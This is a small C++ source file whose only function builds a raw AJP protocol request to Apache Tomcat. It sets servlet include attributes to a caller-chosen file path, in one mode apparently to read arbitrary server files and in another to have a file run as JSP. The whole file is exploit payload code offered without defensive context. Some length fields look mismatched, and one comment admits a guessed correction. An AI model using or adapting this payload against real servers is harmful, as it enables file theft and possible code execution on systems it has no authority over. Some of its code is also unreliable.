#include "hdr.h"

len_str getPayload(string target, string ip, string port, string file, int mode) {
    len_str out;
    len_str body;

    ajp_hdr hdr;
    hdr.code = 2;
    hdr.method = 2;

    body.add("\x00\x08HTTP/1.1\x00", 11);

    if (mode == 0) {
        body.add("\x00\x0b//index.txt\x00", 14);
    }
    else {
        body.add("\x00\x0b//index.jsp\x00", 14);
    }

    for (int i = 0; i < 3; i++) {
        body.add("\x00", 1);
        size_t tlen = target.length();
        body.add((const char*)&tlen, 1);
        if (i == 1) {
            body.add(target.c_str(), target.length());
        }
        else {
            body.add(ip.c_str(), ip.length());
        }
        body.add("\x00", 1);
    }

    body.add("\x00\x50\x00\x00\x01\xa0\x0b\x00\x0c", 9);
    body.add(ip.c_str(), ip.length());
    body.add(":", 1);
    body.add(port.c_str(), port.length());
    body.add("\x00\x0a\x00!javax.servlet.include.request_uri\x00\x00\x05index\x00", 46);

    body.add("\x0a\x00\"javax.servlet.include.servlet_path\x00\x00", 39);
    size_t flen = file.length();
    body.add((const char*)&flen, 1);
    body.add(file.c_str(), file.length());
    body.add("\x00\xff", 2);

    hdr.len = htons(body.len + 2);                  //idk why len misses 2 bytes, so i just add this to account for them
    out.add((const char*)&hdr, sizeof ajp_hdr);
    out.add(body.c_str, body.len);

    return out;
}